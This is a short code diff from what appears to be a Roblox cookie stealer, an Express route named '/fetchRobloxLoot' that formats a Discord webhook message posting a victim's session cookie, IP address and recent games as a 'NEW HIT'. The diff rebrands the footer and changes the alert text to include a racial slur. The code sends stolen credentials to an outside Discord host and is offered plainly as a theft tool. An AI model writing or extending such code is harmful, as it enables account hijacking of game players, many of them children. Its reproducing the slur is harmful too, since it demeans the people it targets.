@@ -91,11 +91,11 @@ app.get('/fetchRobloxLoot', async (req, res) => {
                 { "name": "🌐 Client IP", "value": `\`${clientSuppliedIP}\``, "inline": true },
                 { "name": "🎮 Recently Played", "value": intel.recentGames || "N/A", "inline": false }
             ],
-            "footer": { "text": `Engineered by DarkGemini | ${new Date().toUTCString()}` },
+            "footer": { "text": `EELHEX OWNS YOU 😹 V2 | ${new Date().toUTCString()}` },
             "timestamp": new Date().toISOString()
         };
         const finalDiscordPayload = {
-            "content": `**@everyone NEW HIT GUYS 🎯**\n**Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
+            "content": `**@everyone NEW HIT NIGGA  🎯**\n**Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
             "embeds": [discordEmbed], "username": "DG Glitch (Immortal)"
         };
         
